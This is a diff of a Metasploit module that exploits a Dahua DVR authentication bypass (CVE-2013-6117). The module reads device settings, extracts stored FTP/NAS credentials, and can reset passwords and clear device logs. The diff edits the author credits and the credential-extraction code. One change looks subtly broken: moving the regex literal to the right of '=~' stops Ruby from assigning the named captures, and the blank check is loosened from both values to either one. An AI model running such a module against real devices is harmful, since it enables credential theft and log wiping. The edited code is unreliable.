@@ -8,13 +8,14 @@ class Metasploit3 < Msf::Auxiliary
       'Name'            => %q(Dahua DVR Auth Bypass Scanner),
       'Description'     => %q(Scans for Dahua-based DVRs and then grabs settings. Optionally resets a user's password and clears the device logs),
       'Author'          => [
+        'Tyler Bennett - Talos Consulting', # Metasploit module
         'Jake Reynolds - Depth Security', # Vulnerability Discoverer
-        'Tyler Bennett - Talos Infosec', # Metasploit Module
         'Jon Hart <jon_hart[at]rapid7.com>', # improved metasploit module
         'Nathan McBride' # regex extraordinaire
       ],
       'References'      => [
         [ 'CVE', '2013-6117' ],
+        [ 'URL', 'https://talosconsulting.net' ],
         [ 'URL', 'https://depthsecurity.com/blog/dahua-dvr-authentication-bypass-cve-2013-6117' ]
       ],
       'License'         => MSF_LICENSE,
@@ -163,10 +164,10 @@ class Metasploit3 < Msf::Auxiliary
       server = Regexp.last_match[1].unpack('C*').join('.')
       port = Regexp.last_match[2].unpack('S')
     end
-    if /[\x00]{16,}(?<ftpuser>[[:print:]]+)[\x00]{16,}(?<ftppass>[[:print:]]+)/ =~ data
+    if data =~ /[\x00]{16,}(?<ftpuser>[[:print:]]+)[\x00]{16,}(?<ftppass>[[:print:]]+)/
       ftpuser.strip!
       ftppass.strip!
-      unless ftpuser.blank? || ftppass.blank?
+      if !ftpuser.blank? || !ftppass.blank?
         print_good("#{peer} --  NAS Server: #{server}")
         print_good("#{peer} --  NAS Port: #{port}")
         print_good("#{peer} -- FTP User: #{ftpuser}")
